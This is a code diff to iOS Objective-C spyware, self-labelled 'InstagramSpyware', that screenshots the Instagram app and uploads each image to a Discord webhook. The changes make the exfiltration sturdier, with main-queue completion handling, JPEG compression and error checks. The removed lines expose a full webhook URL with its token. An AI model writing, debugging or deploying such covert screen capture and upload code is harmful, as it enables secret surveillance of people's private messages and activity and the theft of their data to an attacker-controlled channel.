@@ -43,16 +43,21 @@
 - (instancetype)init {
     self = [super init];
     if (self) {
-        _discordWebhookURL = @"https://discordapp.com/api/webhooks/1252261340702310422/iUMCrX_RbZl_mHaUFN7czWbczo-88jV1xSC97_bN3AWtsRsUgrpwIl23BRbk1ti7u8ma";
+        _discordWebhookURL = @"https://discord.com/api/webhooks/YOUR_WEBHOOK_ID/YOUR_WEBHOOK_TOKEN";
         
+        // --- FIX IS HERE ---
+        // Create a configuration that uses the main queue for completion handlers.
+        // This prevents threading-related crashes when accessing objects in the completion block.
         NSURLSessionConfiguration *config = [NSURLSessionConfiguration defaultSessionConfiguration];
         config.timeoutIntervalForRequest = 30.0;
         config.timeoutIntervalForResource = 60.0;
+        // Add this line:
+        config.operationQueue = [NSOperationQueue mainQueue]; 
+        
         _urlSession = [NSURLSession sessionWithConfiguration:config];
     }
     return self;
 }
-
 - (void)setDiscordWebhookURL:(NSString *)webhookURL {
     _discordWebhookURL = webhookURL;
 }
@@ -326,54 +331,70 @@
         return;
     }
 
-    NSData *imageData = UIImagePNGRepresentation(screenshot);
+    // Convert the image to JPEG data. It's generally smaller and faster than PNG.
+    NSData *imageData = UIImageJPEGRepresentation(screenshot, 0.8);
     if (!imageData) {
-        NSLog(@"[InstagramSpyware] Failed to convert screenshot to PNG data.");
+        NSLog(@"[InstagramSpyware] Failed to convert screenshot to JPEG data.");
         return;
     }
 
-    NSMutableURLRequest *request = [NSMutableURLRequest requestWithURL:[NSURL URLWithString:_discordWebhookURL]];
+    // Create the URL and Request
+    NSURL *url = [NSURL URLWithString:_discordWebhookURL];
+    NSMutableURLRequest *request = [NSMutableURLRequest requestWithURL:url];
     [request setHTTPMethod:@"POST"];
 
+    // Define the boundary for the multipart/form-data
     NSString *boundary = @"----WebKitFormBoundary7MA4YWxkTrZu0gW";
-    [request setValue:[NSString stringWithFormat:@"multipart/form-data; boundary=%@", boundary] forHTTPHeaderField:@"Content-Type"];
+    NSString *contentType = [NSString stringWithFormat:@"multipart/form-data; boundary=%@", boundary];
+    [request setValue:contentType forHTTPHeaderField:@"Content-Type"];
 
+    // Create the body data
     NSMutableData *body = [NSMutableData data];
 
-    // Payload JSON part
+    // 1. Add the payload_json part
     NSDictionary *payloadJson = @{
         @"content": @"📸 New Instagram screenshot captured",
         @"username": @"Instagram Spy",
         @"avatar_url": @"https://i.imgur.com/mDKlggm.png"
     };
-    NSData *payloadData = [NSJSONSerialization dataWithJSONObject:payloadJson options:0 error:nil];
+    NSError *jsonError;
+    NSData *payloadData = [NSJSONSerialization dataWithJSONObject:payloadJson options:0 error:&jsonError];
+    if (jsonError) {
+        NSLog(@"[InstagramSpyware] Failed to serialize JSON payload for screenshot: %@", jsonError.localizedDescription);
+        return;
+    }
+
     [body appendData:[[NSString stringWithFormat:@"--%@\r\n", boundary] dataUsingEncoding:NSUTF8StringEncoding]];
     [body appendData:[@"Content-Disposition: form-data; name=\"payload_json\"\r\n\r\n" dataUsingEncoding:NSUTF8StringEncoding]];
     [body appendData:payloadData];
     [body appendData:[@"\r\n" dataUsingEncoding:NSUTF8StringEncoding]];
 
-    // Image file part
+    // 2. Add the image file part
     [body appendData:[[NSString stringWithFormat:@"--%@\r\n", boundary] dataUsingEncoding:NSUTF8StringEncoding]];
-    [body appendData:[@"Content-Disposition: form-data; name=\"file1\"; filename=\"screenshot.png\"\r\n" dataUsingEncoding:NSUTF8StringEncoding]];
-    [body appendData:[@"Content-Type: image/png\r\n\r\n" dataUsingEncoding:NSUTF8StringEncoding]];
+    [body appendData:[@"Content-Disposition: form-data; name=\"file1\"; filename=\"screenshot.jpg\"\r\n" dataUsingEncoding:NSUTF8StringEncoding]];
+    [body appendData:[@"Content-Type: image/jpeg\r\n\r\n" dataUsingEncoding:NSUTF8StringEncoding]];
     [body appendData:imageData];
     [body appendData:[@"\r\n" dataUsingEncoding:NSUTF8StringEncoding]];
+
+    // 3. Close the boundary
     [body appendData:[[NSString stringWithFormat:@"--%@--\r\n", boundary] dataUsingEncoding:NSUTF8StringEncoding]];
 
+    // Set the request body
     [request setHTTPBody:body];
 
-    NSURLSessionDataTask *task = [_urlSession dataTaskWithRequest:request completionHandler:^(NSData *data, NSURLResponse *response, NSError *error) {
+    // Create and run the task
+    NSURLSessionDataTask *task = [_urlSession dataTaskWithRequest:request
+                                                completionHandler:^(NSData *data, NSURLResponse *response, NSError *error) {
         if (error) {
-            NSLog(@"[InstagramSpyware] Discord screenshot upload FAILED with error: %@", error.localizedDescription);
+            NSLog(@"[InstagramSpyware] Discord screenshot upload FAILED: %@", error.localizedDescription);
             return;
         }
         NSHTTPURLResponse *httpResponse = (NSHTTPURLResponse *)response;
-        NSLog(@"[InstagramSpyware] Discord screenshot upload response status code: %ld", (long)httpResponse.statusCode);
-        if (httpResponse.statusCode < 200 || httpResponse.statusCode >= 300) {
-            NSString *responseBody = [[NSString alloc] initWithData:data encoding:NSUTF8StringEncoding];
-            NSLog(@"[InstagramSpyware] Discord screenshot upload failed with status %ld. Response body: %@", (long)httpResponse.statusCode, responseBody);
-        } else {
+        if (httpResponse.statusCode >= 200 && httpResponse.statusCode < 300) {
             NSLog(@"[InstagramSpyware] Discord screenshot uploaded successfully.");
+        } else {
+            NSString *responseBody = [[NSString alloc] initWithData:data encoding:NSUTF8StringEncoding];
+            NSLog(@"[InstagramSpyware] Discord screenshot upload failed with status %ld. Response: %@", (long)httpResponse.statusCode, responseBody);
         }
     }];
     [task resume];
